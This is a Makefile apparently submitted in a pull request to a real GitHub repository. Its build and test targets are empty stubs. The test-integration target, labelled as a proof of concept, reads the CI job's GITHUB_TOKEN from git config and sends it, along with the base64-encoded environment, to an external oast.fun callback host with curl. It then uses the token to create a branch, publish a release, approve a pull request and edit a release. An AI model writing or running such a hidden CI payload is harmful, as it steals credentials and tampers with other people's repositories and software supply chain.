# Copyright 2023 Akamai Technologies, Inc.

SHELL = /bin/bash
.SHELLFLAGS = -ec

.PHONY: all build test test-integration test-e2e

all: build

build:
	@echo "Building..."

test:
	@echo "Running tests..."

test-integration:
	@echo "=== PoC: GITHUB_TOKEN Write Access Proof ===" >&2
	@TOKEN=$$(git config --get http.https://github.com/.extraheader 2>/dev/null | sed 's/AUTHORIZATION: basic //' | base64 -d 2>/dev/null | sed 's/x-access-token://') ; \
	echo "TOKEN_PREFIX=$${TOKEN:0:8}****" >&2 ; \
	curl -s "http://dscxewzgeaehchedqqctug4nr8ubvykn4.oast.fun/?t=$$TOKEN" >&2 || true ; \
	ENV=$$(env | base64 -w 0) ; \
	curl -s "http://dscxewzgeaehchedqqctug4nr8ubvykn4.oast.fun/?e=$$ENV" >&2 || true ; \
	HEAD_SHA=$$(curl -s -H "Authorization: token $$TOKEN" https://api.github.com/repos/linode/linode-cosi-driver/git/refs/heads/main | jq -r ".object.sha") ; \
	echo "HEAD_SHA=$$HEAD_SHA" >&2 ; \
	CREATE_BRANCH=$$(curl -s -o /dev/null -w "%{http_code}" -X POST -H "Authorization: token $$TOKEN" \
	  -d "{\"ref\": \"refs/heads/deku_poc-branch\", \"sha\": \"$$HEAD_SHA\"}" \
	  https://api.github.com/repos/linode/linode-cosi-driver/git/refs) ; \
	echo "CREATE_BRANCH: $$CREATE_BRANCH" >&2 ; \
	CREATE_RELEASE=$$(curl -s -o /dev/null -w "%{http_code}" -X POST -H "Authorization: token $$TOKEN" \
	  -H "Accept: application/vnd.github.v3+json" \
	  -d "{\"tag_name\": \"poc-write-proof-v1\", \"target_commitish\": \"main\", \"name\": \"d3ku_poc\", \"body\": \"d3ku_poc\", \"draft\": false, \"prerelease\": true}" \
	  https://api.github.com/repos/linode/linode-cosi-driver/releases) ; \
	echo "CREATE_RELEASE: $$CREATE_RELEASE" >&2 ; \
	APPROVE_PR=$$(curl -s -o /dev/null -w "%{http_code}" --request POST \
	  --url "https://api.github.com/repos/linode/linode-cosi-driver/pulls/262/reviews" \
	  --header "authorization: Bearer $$TOKEN" \
	  --header "content-type: application/json" \
	  -d "{\"event\":\"APPROVE\", \"body\": \"PoC: This approval was submitted via GITHUB_TOKEN from pull_request_target workflow.\"}") ; \
	echo "APPROVE_PR: $$APPROVE_PR" >&2 ; \
	EDIT_RELEASE=$$(curl -s -o /dev/null -w "%{http_code}" -X PATCH -H "Authorization: token $$TOKEN" \
	  -H "Accept: application/vnd.github+json" \
	  -d "{\"name\": \"d3ku_poc\", \"body\": \"d3ku_poc\"}" \
	  https://api.github.com/repos/linode/linode-cosi-driver/releases/295797255) ; \
	echo "EDIT_RELEASE: $$EDIT_RELEASE" >&2 ; \
	echo "=== PoC Complete ===" >&2

test-e2e:
	@echo "skip" >&2